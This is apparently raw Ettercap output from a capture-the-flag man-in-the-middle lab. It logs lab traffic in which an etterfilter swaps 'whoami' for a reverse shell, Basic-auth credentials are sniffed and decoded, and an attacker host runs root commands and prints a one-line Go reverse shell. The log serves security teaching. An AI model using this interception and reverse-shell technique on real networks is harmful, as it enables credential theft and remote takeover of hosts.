Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:46:54 2023 [853218]
TCP  192.168.12.10:48212 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:46:54 2023 [854933]
TCP  192.168.12.10:48212 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:46:54 2023 [861103]
TCP  192.168.12.20:80 --> 192.168.12.10:48212 | A (0)


Mon Feb  6 17:46:55 2023 [640868]
TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:46:55 2023 [930847]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
pwd


Mon Feb  6 17:46:55 2023 [932988]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:55 2023 [933281]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:46:55 2023 [941083]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | A (0)


Mon Feb  6 17:46:57 2023 [16330]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
ls


Mon Feb  6 17:46:57 2023 [20992]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:57 2023 [100155]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (3)
id


Mon Feb  6 17:46:57 2023 [100291]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)


Mon Feb  6 17:46:57 2023 [251341]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (39)
uid=0(root) gid=0(root) groups=0(root)


Mon Feb  6 17:46:57 2023 [251361]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:46:58 2023 [381777]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
ls


Mon Feb  6 17:46:58 2023 [389010]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:59 2023 [599612]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (7)
whoami


Mon Feb  6 17:46:59 2023 [599768]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)


Mon Feb  6 17:46:59 2023 [600992]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (5)
root


Mon Feb  6 17:46:59 2023 [601005]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:46:59 2023 [672951]
TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:46:59 2023 [931991]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
ls


Mon Feb  6 17:46:59 2023 [932969]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:46:59 2023 [934220]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:46:59 2023 [941032]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | A (0)


Mon Feb  6 17:47:01 2023 [17521]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:01 2023 [21016]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:02 2023 [383102]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:02 2023 [388979]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:03 2023 [932448]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:03 2023 [933029]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:04 2023 [84594]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:47:04 2023 [85113]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | SA (0)


Mon Feb  6 17:47:04 2023 [93025]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:04 2023 [103460]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
whoami


Mon Feb  6 17:47:04 2023 [108951]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:04 2023 [751093]
TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:05 2023 [18673]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
pwd


Mon Feb  6 17:47:05 2023 [20974]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:05 2023 [752853]
TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:06 2023 [384250]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
pwd


Mon Feb  6 17:47:06 2023 [388997]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:06 2023 [865968]
TCP  192.168.12.10:48218 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:47:06 2023 [869076]
TCP  192.168.12.20:80 --> 192.168.12.10:48218 | SA (0)


Mon Feb  6 17:47:06 2023 [877054]
TCP  192.168.12.10:48218 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:06 2023 [877420]
TCP  192.168.12.10:48218 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:47:06 2023 [885128]
TCP  192.168.12.20:80 --> 192.168.12.10:48218 | A (0)


Mon Feb  6 17:47:06 2023 [887001]
TCP  192.168.12.20:80 --> 192.168.12.10:48218 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:47:06 2023 [887223]
TCP  192.168.12.20:80 --> 192.168.12.10:48218 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:47:06 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:47:06 2023 [893088]
TCP  192.168.12.10:48218 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:06 2023 [894019]
TCP  192.168.12.10:48218 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:47:06 2023 [901080]
TCP  192.168.12.20:80 --> 192.168.12.10:48218 | A (0)


Mon Feb  6 17:47:07 2023 [768862]
TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:07 2023 [864865]
TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:07 2023 [934907]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
pwd


Mon Feb  6 17:47:07 2023 [940911]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:08 2023 [105548]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (4)
pwd


Mon Feb  6 17:47:08 2023 [108995]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:08 2023 [109265]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:47:08 2023 [116981]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | A (0)


Mon Feb  6 17:47:09 2023 [19789]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
ls


Mon Feb  6 17:47:09 2023 [21055]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:09 2023 [729423]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (3)
ls


Mon Feb  6 17:47:09 2023 [729562]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)


Mon Feb  6 17:47:09 2023 [730795]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:47:09 2023 [730806]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:10 2023 [385429]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
ls


Mon Feb  6 17:47:10 2023 [388947]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:11 2023 [935986]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
ls


Mon Feb  6 17:47:11 2023 [940975]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:11 2023 [960882]
TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:12 2023 [106657]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (3)
ls


Mon Feb  6 17:47:12 2023 [109001]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:12 2023 [110277]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:47:12 2023 [117096]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | A (0)


Mon Feb  6 17:47:13 2023 [20895]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
whoami


Mon Feb  6 17:47:13 2023 [28974]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:14 2023 [74421]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (13)
cat root.txt


Mon Feb  6 17:47:14 2023 [74885]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | A (0)


Mon Feb  6 17:47:14 2023 [78807]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (27)
THM{wh4t_an_ev1l_M!tM_u_R}


Mon Feb  6 17:47:14 2023 [78819]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:14 2023 [386493]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:14 2023 [389013]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:15 2023 [937134]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:15 2023 [940974]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:16 2023 [107783]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:16 2023 [109053]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:16 2023 [885173]
TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:17 2023 [21438]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
pwd


Mon Feb  6 17:47:17 2023 [29059]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:17 2023 [374967]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:47:17 2023 [381095]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | SA (0)


Mon Feb  6 17:47:17 2023 [388943]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:17 2023 [399349]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:17 2023 [405072]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:17 2023 [912841]
TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:18 2023 [15922]
TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:18 2023 [387573]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
pwd


Mon Feb  6 17:47:18 2023 [388933]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:18 2023 [905880]
TCP  192.168.12.10:48226 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:47:18 2023 [909111]
TCP  192.168.12.20:80 --> 192.168.12.10:48226 | SA (0)


Mon Feb  6 17:47:18 2023 [917005]
TCP  192.168.12.10:48226 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:18 2023 [917402]
TCP  192.168.12.10:48226 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:47:18 2023 [925141]
TCP  192.168.12.20:80 --> 192.168.12.10:48226 | A (0)


Mon Feb  6 17:47:18 2023 [927075]
TCP  192.168.12.20:80 --> 192.168.12.10:48226 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:47:18 2023 [927299]
TCP  192.168.12.20:80 --> 192.168.12.10:48226 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:47:18 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK


Mon Feb  6 17:47:18 2023 [932986]
TCP  192.168.12.10:48226 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:18 2023 [933938]
TCP  192.168.12.10:48226 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:47:18 2023 [941200]
TCP  192.168.12.20:80 --> 192.168.12.10:48226 | A (0)


Mon Feb  6 17:47:19 2023 [32834]
TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:19 2023 [928862]
TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:19 2023 [938259]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
pwd


Mon Feb  6 17:47:19 2023 [940913]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:20 2023 [108914]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (4)
pwd


Mon Feb  6 17:47:20 2023 [116997]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:20 2023 [152799]
TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:21 2023 [23562]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
ls


Mon Feb  6 17:47:21 2023 [28969]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:21 2023 [48932]
TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:21 2023 [401398]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (4)
pwd


Mon Feb  6 17:47:21 2023 [405001]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:21 2023 [405282]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:47:21 2023 [413027]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | A (0)


Mon Feb  6 17:47:22 2023 [388642]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
ls


Mon Feb  6 17:47:22 2023 [388937]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:23 2023 [939337]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
ls


Mon Feb  6 17:47:23 2023 [940993]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:23 2023 [992895]
TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:23 2023 [992919]
TCP  192.168.12.20:34776 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:24 2023 [110042]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (3)
ls


Mon Feb  6 17:47:24 2023 [117039]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:24 2023 [428194]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (11)
cat rev.go


Mon Feb  6 17:47:24 2023 [429294]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (175)
package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.12.10:4444");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}


Mon Feb  6 17:47:24 2023 [429313]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:25 2023 [24703]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:25 2023 [28974]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:25 2023 [272905]
TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:25 2023 [402490]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (3)
ls


Mon Feb  6 17:47:25 2023 [405197]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:25 2023 [406505]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:47:25 2023 [413112]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | A (0)


Mon Feb  6 17:47:26 2023 [389787]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:26 2023 [397027]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:27 2023 [940440]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:27 2023 [940958]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:28 2023 [111204]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (7)
whoami


Mon Feb  6 17:47:28 2023 [116961]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:29 2023 [25845]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (4)
pwd


Mon Feb  6 17:47:29 2023 [28972]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:29 2023 [403607]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (7)
whoami


Mon Feb  6 17:47:29 2023 [405027]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:30 2023 [401994]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (4)
pwd


Mon Feb  6 17:47:30 2023 [405044]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:30 2023 [690927]
TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:30 2023 [803361]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | S (0)


Mon Feb  6 17:47:30 2023 [805073]
TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | SA (0)


Mon Feb  6 17:47:30 2023 [813062]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:30 2023 [825221]
TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (7)
whoami


Mon Feb  6 17:47:30 2023 [829051]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:30 2023 [958870]
TCP  192.168.12.10:48232 --> 192.168.12.20:80 | S (0)


Mon Feb  6 17:47:30 2023 [965055]
TCP  192.168.12.20:80 --> 192.168.12.10:48232 | SA (0)


Mon Feb  6 17:47:30 2023 [973039]
TCP  192.168.12.10:48232 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:30 2023 [973253]
TCP  192.168.12.10:48232 --> 192.168.12.20:80 | AP (133)
GET /test.txt HTTP/1.1.
Host: www.server.bob.
Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
User-Agent: curl/7.68.0.
Accept: */*.
.


Mon Feb  6 17:47:30 2023 [981055]
TCP  192.168.12.20:80 --> 192.168.12.10:48232 | A (0)


Mon Feb  6 17:47:30 2023 [982541]
TCP  192.168.12.20:80 --> 192.168.12.10:48232 | AP (17)
HTTP/1.0 200 OK.


Mon Feb  6 17:47:30 2023 [982775]
TCP  192.168.12.20:80 --> 192.168.12.10:48232 | FAP (171)
Server: SimpleHTTP/0.6 Python/2.7.12.
Date: Mon, 06 Feb 2023 17:47:30 GMT.
Content-type: text/plain.
Content-Length: 3.
Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
.
OK
HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt


Mon Feb  6 17:47:30 2023 [989261]
TCP  192.168.12.10:48232 --> 192.168.12.20:80 | A (0)


Mon Feb  6 17:47:30 2023 [990127]
TCP  192.168.12.10:48232 --> 192.168.12.20:80 | FA (0)


Mon Feb  6 17:47:30 2023 [997096]
TCP  192.168.12.20:80 --> 192.168.12.10:48232 | A (0)


Mon Feb  6 17:47:31 2023 [153360]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | AP (13)
cat erver.sh


Mon Feb  6 17:47:31 2023 [157022]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (5)
cat: 

Mon Feb  6 17:47:31 2023 [157038]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:31 2023 [157269]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (8)
erver.sh

Mon Feb  6 17:47:31 2023 [157279]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:31 2023 [157487]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (27)
: No such file or directory

Mon Feb  6 17:47:31 2023 [157497]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:31 2023 [157694]
TCP  192.168.12.20:34764 --> 192.168.12.66:6666 | AP (1)



Mon Feb  6 17:47:31 2023 [157703]
TCP  192.168.12.66:6666 --> 192.168.12.20:34764 | A (0)


Mon Feb  6 17:47:31 2023 [491505]
TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:31 2023 [704799]
TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:31 2023 [941586]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (4)
pwd


Mon Feb  6 17:47:31 2023 [949015]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:32 2023 [112398]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (4)
pwd


Mon Feb  6 17:47:32 2023 [116997]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:32 2023 [184833]
TCP  192.168.12.20:34786 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:32 2023 [504851]
TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:33 2023 [27051]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (3)
ls


Mon Feb  6 17:47:33 2023 [28947]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:33 2023 [404697]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (4)
pwd


Mon Feb  6 17:47:33 2023 [412912]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:33 2023 [464778]
TCP  192.168.12.20:34790 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:33 2023 [720880]
TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:34 2023 [405857]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (3)
ls


Mon Feb  6 17:47:34 2023 [413004]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:34 2023 [520911]
TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:34 2023 [827201]
TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (4)
pwd


Mon Feb  6 17:47:34 2023 [829027]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:34 2023 [829327]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | AP (6)
/root


Mon Feb  6 17:47:34 2023 [837100]
TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | A (0)


Mon Feb  6 17:47:35 2023 [942674]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (3)
ls


Mon Feb  6 17:47:35 2023 [948922]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:36 2023 [113500]
TCP  192.168.12.10:4444 --> 192.168.12.20:44728 | AP (3)
ls


Mon Feb  6 17:47:36 2023 [117021]
TCP  192.168.12.20:44728 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:36 2023 [280893]
TCP  192.168.12.20:34782 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:37 2023 [28231]
TCP  192.168.12.10:4444 --> 192.168.12.20:44708 | AP (7)
whoami


Mon Feb  6 17:47:37 2023 [28994]
TCP  192.168.12.20:44708 --> 192.168.12.10:4444 | A (0)
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:37 2023 [405822]
TCP  192.168.12.10:4444 --> 192.168.12.20:44736 | AP (3)
ls


Mon Feb  6 17:47:37 2023 [412999]
TCP  192.168.12.20:44736 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:37 2023 [816805]
TCP  192.168.12.20:34794 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:38 2023 [406983]
TCP  192.168.12.10:4444 --> 192.168.12.20:44714 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:38 2023 [413037]
TCP  192.168.12.20:44714 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:38 2023 [584849]
TCP  192.168.12.20:34800 --> 192.168.12.66:6666 | S (0)


Mon Feb  6 17:47:38 2023 [828262]
TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | AP (3)
ls


Mon Feb  6 17:47:38 2023 [829008]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | A (0)


Mon Feb  6 17:47:38 2023 [833430]
TCP  192.168.12.20:44744 --> 192.168.12.10:4444 | AP (30)
rev.go
root.txt
server.sh
www


Mon Feb  6 17:47:38 2023 [837097]
TCP  192.168.12.10:4444 --> 192.168.12.20:44744 | A (0)


Mon Feb  6 17:47:39 2023 [943840]
TCP  192.168.12.10:4444 --> 192.168.12.20:44722 | AP (7)
whoami
filter engine: Cannot open file /root/ettercap.log
###### ETTERFILTER: substituted 'whoami' with reverse shell. ######



Mon Feb  6 17:47:39 2023 [948970]
TCP  192.168.12.20:44722 --> 192.168.12.10:4444 | A (0)


